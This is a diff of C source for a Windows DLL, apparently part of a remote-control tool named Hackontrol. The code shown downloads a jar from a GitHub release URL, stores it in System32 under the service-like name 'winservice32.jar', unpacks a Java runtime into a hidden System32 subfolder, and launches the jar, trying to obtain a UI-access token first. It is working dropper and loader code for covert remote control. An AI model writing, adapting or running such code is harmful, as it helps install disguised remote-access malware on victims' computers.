@@ -1,108 +1,148 @@
 #include <khopanwin32.h>
 #include <khopanstring.h>
-#include "downloadjar.h"
-#include "extractor.h"
-#include "executor.h"
+#include "extract.h"
+#include "uiaccess.h"
 
 #define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")
 
-#define SYSTEM32         L"System32"
-#define JAR_NAME         L"winservice32.jar"
-#define RUNDLL32EXE      L"rundll32.exe"
-#define LIBRARY_NAME     L"libdll32.dll"
-#define JAVA_PATH_NAME    "jn"
-#define REMOTE_FILE_NAME L"hackontrol.jar"
+#define FILE_JAVAW        L"javaw.exe"
+#define FILE_LIBDLL32     L"libdll32.dll"
+#define FILE_RUNDLL32     L"rundll32.exe"
+#define FILE_HACKONTROL   L"hackontrol.jar"
+#define FILE_WINSERVICE32 L"winservice32.jar"
+#define FOLDER_SYSTEM32   L"System32"
+#define FOLDER_JAVA       L"jn"
+#define FUNCTION_LIBDLL32 L"DownloadFile"
+#define URL_HACKONTROL    L"https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/"
+
+static BOOL DownloadJar(const LPWSTR pathFolderSystem32, const LPWSTR pathFileRundll32, const LPWSTR argumentFileRundll32);
+static void ExecuteJarFile(const LPWSTR pathFileJavaw, const LPWSTR argumentFileJavaw, const LPWSTR pathFolderJavaBinary);
 
 __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LPSTR argument, int command) {
-	LPWSTR windowsDirectoryPath = KHWin32GetWindowsDirectoryW();
+	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();
 
-	if(!windowsDirectoryPath) {
+	if(!pathFolderWindows) {
 		KHWin32DialogErrorW(GetLastError(), L"KHGetWindowsDirectoryW");
 		return;
 	}
 	
-	LPWSTR system32Path = KHFormatMessageW(L"%ws\\" SYSTEM32, windowsDirectoryPath);
-	FREE(windowsDirectoryPath);
+	LPWSTR pathFolderSystem32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32, pathFolderWindows);
+	FREE(pathFolderWindows);
 
-	if(!system32Path) {
+	if(!pathFolderSystem32) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
 		return;
 	}
 
-	LPWSTR rundll32Path = KHFormatMessageW(L"%ws\\" RUNDLL32EXE, system32Path);
+	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FILE_RUNDLL32, pathFolderSystem32);
 
-	if(!rundll32Path) {
+	if(!pathFileRundll32) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		goto freeSystem32Path;
+		goto freePathFolderSystem32;
 	}
 
-	LPWSTR downloadArgument = KHFormatMessageW(L"%ws " LIBRARY_NAME L",DownloadFile https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/release/" REMOTE_FILE_NAME L"," JAR_NAME, rundll32Path);
+	if(!DownloadJar(pathFolderSystem32, pathFileRundll32, FILE_RUNDLL32 L" " FILE_LIBDLL32 L"," FUNCTION_LIBDLL32 L" " URL_HACKONTROL FILE_HACKONTROL L"," FILE_WINSERVICE32)) {
+		goto freePathFileRundll32;
+	}
 
-	if(!downloadArgument) {
+	LPSTR pathFolderJava = KHFormatMessageA("%ws\\%ws", pathFolderSystem32, FOLDER_JAVA);
+
+	if(!pathFolderJava) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		goto freeRundll32Path;
+		goto freePathFileRundll32;
 	}
 
-	BOOL result = DownloadJar(system32Path, rundll32Path, downloadArgument);
-	FREE(downloadArgument);
-
-	if(!result) {
-		goto freeRundll32Path;
-	}
-
-	LPSTR javaDirectoryPath = KHFormatMessageA("%ws\\" JAVA_PATH_NAME, system32Path);
-
-	if(!javaDirectoryPath) {
-		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		goto freeRundll32Path;
-	}
-
-	if(!CreateDirectoryA(javaDirectoryPath, NULL)) {
+	if(!CreateDirectoryA(pathFolderJava, NULL)) {
 		DWORD error = GetLastError();
 
 		if(error != ERROR_ALREADY_EXISTS) {
 			KHWin32DialogErrorW(error, L"KHFormatMessageW");
-			FREE(javaDirectoryPath);
-			goto freeRundll32Path;
+			FREE(pathFolderJava);
+			goto freePathFileRundll32;
 		}
 	}
 
-	result = ExtractJRE(javaDirectoryPath);
-	FREE(javaDirectoryPath);
+	BOOL result = ExtractJRE(pathFolderJava);
+	FREE(pathFolderJava);
 
 	if(result) {
-		goto freeRundll32Path;
+		goto freePathFileRundll32;
 	}
 
-	LPWSTR javaBinPath = KHFormatMessageW(L"%ws\\%S\\bin", system32Path, JAVA_PATH_NAME);
+	LPWSTR pathFolderJavaBinary = KHFormatMessageW(L"%ws\\" FOLDER_JAVA L"\\bin", pathFolderSystem32);
 
-	if(!javaBinPath) {
+	if(!pathFolderJavaBinary) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		goto freeRundll32Path;
+		goto freePathFileRundll32;
 	}
 
-	LPWSTR javaExecutablePath = KHFormatMessageW(L"%ws\\javaw.exe", javaBinPath);
+	LPWSTR pathFileJavaw = KHFormatMessageW(L"%ws\\" FILE_JAVAW, pathFolderJavaBinary);
 
-	if(!javaExecutablePath) {
+	if(!pathFileJavaw) {
 		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		goto freeJavaBinPath;
+		FREE(pathFolderJavaBinary);
+		goto freePathFileRundll32;
 	}
 
-	LPWSTR javaCommandArgument = KHFormatMessageW(L"%ws -jar ..\\..\\" JAR_NAME, javaExecutablePath);
+	ExecuteJarFile(pathFileJavaw, FILE_JAVAW L" -jar ..\\..\\" FILE_WINSERVICE32, pathFolderJavaBinary);
+	FREE(pathFileJavaw);
+	FREE(pathFolderJavaBinary);
+freePathFileRundll32:
+	FREE(pathFileRundll32);
+freePathFolderSystem32:
+	FREE(pathFolderSystem32);
+}
 
-	if(!javaCommandArgument) {
-		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
-		goto freeJavaExecutablePath;
+static BOOL DownloadJar(const LPWSTR pathFolderSystem32, const LPWSTR pathFileRundll32, const LPWSTR argumentFileRundll32) {
+	STARTUPINFO startupInformation = {0};
+	startupInformation.cb = sizeof(startupInformation);
+	PROCESS_INFORMATION processInformation;
+
+	if(!CreateProcessW(pathFileRundll32, argumentFileRundll32, NULL, NULL, TRUE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, pathFolderSystem32, &startupInformation, &processInformation)) {
+		KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
+		return FALSE;
 	}
 
-	ExecuteJarFile(javaExecutablePath, javaCommandArgument, javaBinPath);
-	FREE(javaCommandArgument);
-freeJavaExecutablePath:
-	FREE(javaExecutablePath);
-freeJavaBinPath:
-	FREE(javaBinPath);
-freeRundll32Path:
-	FREE(rundll32Path);
-freeSystem32Path:
-	FREE(system32Path);
+	BOOL returnValue = FALSE;
+
+	if(WaitForSingleObject(processInformation.hProcess, INFINITE) == WAIT_FAILED) {
+		KHWin32DialogErrorW(GetLastError(), L"WaitForSingleObject");
+		goto closeHandles;
+	}
+
+	returnValue = TRUE;
+closeHandles:
+	CloseHandle(processInformation.hProcess);
+	CloseHandle(processInformation.hThread);
+	return returnValue;
+}
+
+static void ExecuteJarFile(const LPWSTR pathFileJavaw, const LPWSTR argumentFileJavaw, const LPWSTR pathFolderJavaBinary) {
+	STARTUPINFO startupInformation = {0};
+	startupInformation.cb = sizeof(startupInformation);
+	PROCESS_INFORMATION processInformation;
+	HANDLE accessToken;
+
+	if(!CreateUIAccessToken(&accessToken)) {
+		accessToken = NULL;
+	}
+
+	if(accessToken) {
+		if(!CreateProcessAsUserW(accessToken, pathFileJavaw, argumentFileJavaw, NULL, NULL, FALSE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, pathFolderJavaBinary, &startupInformation, &processInformation)) {
+			KHWin32DialogErrorW(GetLastError(), L"CreateProcessAsUserW");
+			return;
+		}
+	} else {
+		if(!CreateProcessW(pathFileJavaw, argumentFileJavaw, NULL, NULL, TRUE, ABOVE_NORMAL_PRIORITY_CLASS, NULL, pathFolderJavaBinary, &startupInformation, &processInformation)) {
+			KHWin32DialogErrorW(GetLastError(), L"CreateProcessW");
+			return;
+		}
+	}
+
+	if(WaitForSingleObject(processInformation.hProcess, INFINITE) == WAIT_FAILED) {
+		KHWin32DialogErrorW(GetLastError(), L"WaitForSingleObject");
+	}
+
+	CloseHandle(processInformation.hProcess);
+	CloseHandle(processInformation.hThread);
 }
